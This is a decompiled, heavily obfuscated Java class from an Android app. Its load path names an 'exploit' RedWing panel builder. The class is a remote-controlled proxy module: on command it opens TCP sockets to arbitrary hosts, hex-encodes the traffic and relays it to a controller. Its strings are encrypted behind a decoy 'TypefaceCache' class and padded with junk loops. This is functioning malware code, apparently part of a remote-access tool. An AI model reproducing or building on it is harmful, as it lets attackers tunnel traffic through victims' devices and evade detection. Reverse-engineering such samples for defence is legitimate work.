package v.s;

import android.os.Process;
import app.mobilex.plus.util.TypefaceCache;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class sJoLPxEklk5a9kh {
    public volatile boolean JXn4Qf7zpnLjP5;
    public final EZbVnuP8e1Nfu7 dDIMxZXP1V8HdM;
    public ExecutorService vekpFI4d1Nc4fakF;
    public final ConcurrentHashMap w9sT1Swbhx3hs = new ConcurrentHashMap();
    public final char[] Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("00730027000900D400A400EA008400F0007B002F005A008500F300BB00D700A1").toCharArray();

    static {
        TypefaceCache.obtain("001300640054009F00E9008B00C700A9002D00730057");
    }

    public sJoLPxEklk5a9kh(EZbVnuP8e1Nfu7 eZbVnuP8e1Nfu7) {
        this.dDIMxZXP1V8HdM = eZbVnuP8e1Nfu7;
    }

    private static /* synthetic */ void zfopwuocte() {
    }

    public final void Ee8d2j4S9Vm5yGuR(String str, String str2) {
        ExecutorService executorService;
        uHIAsHsIBe2zMf uhiashsibe2zmf = (uHIAsHsIBe2zMf) this.w9sT1Swbhx3hs.get(str);
        if (uhiashsibe2zmf == null || (executorService = this.vekpFI4d1Nc4fakF) == null) {
            return;
        }
        executorService.submit(new TLNVSdc9dyzTVW7(this, str2, uhiashsibe2zmf, str, 1));
    }

    public final void JXn4Qf7zpnLjP5(uHIAsHsIBe2zMf uhiashsibe2zmf, InputStream inputStream) throws JSONException {
        int i;
        byte[] bArr = new byte[32768];
        while (Process.myPid() < -999) {
            StringBuilder sb = new StringBuilder();
            sb.append(0);
            sb.setLength(0);
        }
        while (uhiashsibe2zmf.JXn4Qf7zpnLjP5 && this.JXn4Qf7zpnLjP5 && (i = inputStream.read(bArr)) > 0) {
            char[] cArr = this.Ee8d2j4S9Vm5yGuR;
            StringBuilder sb2 = new StringBuilder(i * 2);
            for (int i2 = 0; i2 < i; i2++) {
                byte b = bArr[i2];
                sb2.append(cArr[(b & 255) >>> 4]);
                sb2.append(cArr[b & 15]);
            }
            String string = sb2.toString();
            EZbVnuP8e1Nfu7 eZbVnuP8e1Nfu7 = this.dDIMxZXP1V8HdM;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("003300640054009F00E9008000D600A600370077", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "003000730048009400F900B000DC0098002A0072"), uhiashsibe2zmf.dDIMxZXP1V8HdM);
            jSONObject.put(TypefaceCache.obtain("00270077004F0086"), string);
            eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(jSONObject);
        }
    }

    public final void dDIMxZXP1V8HdM(String str) {
        uHIAsHsIBe2zMf uhiashsibe2zmf = (uHIAsHsIBe2zMf) this.w9sT1Swbhx3hs.remove(str);
        if (uhiashsibe2zmf == null) {
            return;
        }
        uhiashsibe2zmf.JXn4Qf7zpnLjP5 = false;
        try {
            Socket socket = uhiashsibe2zmf.w9sT1Swbhx3hs;
            if (socket != null) {
                socket.close();
            }
        } catch (Exception unused) {
        }
    }

    public final void ibVTtJUNfrGYbW() {
        this.JXn4Qf7zpnLjP5 = false;
        for (Map.Entry entry : this.w9sT1Swbhx3hs.entrySet()) {
            uHIAsHsIBe2zMf uhiashsibe2zmf = (uHIAsHsIBe2zMf) entry.getValue();
            uhiashsibe2zmf.JXn4Qf7zpnLjP5 = false;
            try {
                Socket socket = uhiashsibe2zmf.w9sT1Swbhx3hs;
                if (socket != null) {
                    socket.close();
                }
            } catch (Exception unused) {
            }
        }
        this.w9sT1Swbhx3hs.clear();
        ExecutorService executorService = this.vekpFI4d1Nc4fakF;
        if (executorService != null) {
            executorService.shutdownNow();
        }
        this.vekpFI4d1Nc4fakF = null;
        TypefaceCache.obtain("001300640054009F00E900FF00C600B2002D0078005E008B00B000B700D300A90027007A005E009500B000AC00C600A800330066005E0083");
    }

    public final void vekpFI4d1Nc4fakF(String str) {
        dDIMxZXP1V8HdM(str);
    }

    public final void w9sT1Swbhx3hs(final String str, final String str2, final int i) {
        if (this.JXn4Qf7zpnLjP5) {
            final uHIAsHsIBe2zMf uhiashsibe2zmf = new uHIAsHsIBe2zMf(str);
            this.w9sT1Swbhx3hs.put(str, uhiashsibe2zmf);
            ExecutorService executorService = this.vekpFI4d1Nc4fakF;
            if (executorService != null) {
                executorService.submit(new Runnable() { // from class: v.s.fCfYM5fc3YDcRn
                    @Override // java.lang.Runnable
                    public final void run() {
                        String str3 = str2;
                        int i2 = i;
                        uHIAsHsIBe2zMf uhiashsibe2zmf2 = uhiashsibe2zmf;
                        String str4 = str;
                        sJoLPxEklk5a9kh sjolpxeklk5a9kh = this;
                        EZbVnuP8e1Nfu7 eZbVnuP8e1Nfu7 = sjolpxeklk5a9kh.dDIMxZXP1V8HdM;
                        try {
                            Socket socket = new Socket();
                            socket.connect(new InetSocketAddress(str3, i2), 10000);
                            socket.setTcpNoDelay(true);
                            socket.setSoTimeout(0);
                            uhiashsibe2zmf2.w9sT1Swbhx3hs = socket;
                            uhiashsibe2zmf2.vekpFI4d1Nc4fakF = socket.getOutputStream();
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003300640054009F00E9008000D100A8002D0078005E008400E400BA00D6"));
                            jSONObject.put(TypefaceCache.obtain("003000730048009400F900B000DC0098002A0072"), str4);
                            eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(jSONObject);
                            TypefaceCache.obtain("001000730048009400F900B000DC00E7");
                            TypefaceCache.obtain("006300750054008900FE00BA00D100B300260072001B009300FF00FF");
                            sjolpxeklk5a9kh.JXn4Qf7zpnLjP5(uhiashsibe2zmf2, socket.getInputStream());
                        } catch (Exception e) {
                            TypefaceCache.obtain("001000730048009400F900B000DC00E7");
                            TypefaceCache.obtain("006300750054008900FE00BA00D100B300630070005A008E00FC00BA00D600FD0063");
                            e.getMessage();
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003300640054009F00E9008000D700B5003100790049"));
                            jSONObject2.put(TypefaceCache.obtain("003000730048009400F900B000DC0098002A0072"), str4);
                            String strObtain = TypefaceCache.obtain("002600640049008800E2");
                            String message = e.getMessage();
                            if (message == null) {
                                message = TypefaceCache.obtain("002000790055008900F500BC00C600AE002C00780064008100F100B600DE00A20027");
                            }
                            jSONObject2.put(strObtain, message);
                            eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(jSONObject2);
                        } finally {
                            sjolpxeklk5a9kh.dDIMxZXP1V8HdM(str4);
                        }
                    }
                });
            }
        }
    }

    public final void xDyLpEZyrcKVe0() {
        if (this.JXn4Qf7zpnLjP5) {
            return;
        }
        this.JXn4Qf7zpnLjP5 = true;
        this.vekpFI4d1Nc4fakF = Executors.newCachedThreadPool(new kl9kWElPCsw4XTIKUid1(2));
        TypefaceCache.obtain("001300640054009F00E900FF00C600B2002D0078005E008B00B000B700D300A90027007A005E009500B000AC00C600A600310062005E0083");
    }
}
